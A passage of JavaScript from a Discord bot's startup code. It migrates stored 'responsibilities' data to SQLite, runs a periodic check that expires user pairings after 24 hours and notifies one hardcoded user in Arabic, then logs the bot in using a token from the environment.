            if (fileContent && fileContent !== '{}') {
                const data = JSON.parse(fileContent);
                for (const [name, config] of Object.entries(data)) {
                    await dbManager.updateResponsibility(name, config);
                }
                console.log('✅ Migrated Responsibilities to SQLite');
            }
        } catch (e) { 
            console.error('Migration failed:', e.message); 
        }
    }

    // 24-hour expiration check for pairings
setInterval(async () => {
  try {
    const now = Date.now();
    let changed = false;
    const notifiedPairs = new Set();
    const ALLOWED_ID = '636930315503534110';

    for (const [userId, data] of Object.entries(pairingsCache)) {
      if (now - data.timestamp > 24 * 60 * 60 * 1000) {
        const targetId = data.targetId;
        const pairKey = [userId, targetId].sort().join('_');
        if (notifiedPairs.has(pairKey)) {
          continue;
        }
        notifiedPairs.add(pairKey);
        delete pairingsCache[userId];
        if (pairingsCache[targetId]) delete pairingsCache[targetId];
        changed = true;
        
        try {
          if (userId === ALLOWED_ID || targetId === ALLOWED_ID) {
            const allowedUser = await client.users.fetch(ALLOWED_ID);
            const otherId = userId === ALLOWED_ID ? targetId : userId;
            await allowedUser.send(`⏳ **انتهى وقت الاقتران التلقائي (24 ساعة) مع <@${otherId}>.**`);
          }
        } catch (e) {}
      }
    }

    if (changed) {
      savePairings();
    }
  } catch (error) {
    console.error('Error in pairing expiration check:', error);
  }
}, 5 * 60 * 1000); // Check every 5 minutes

    // =================================
    

    client.login(process.env.DISCORD_TOKEN);
}

startBot();
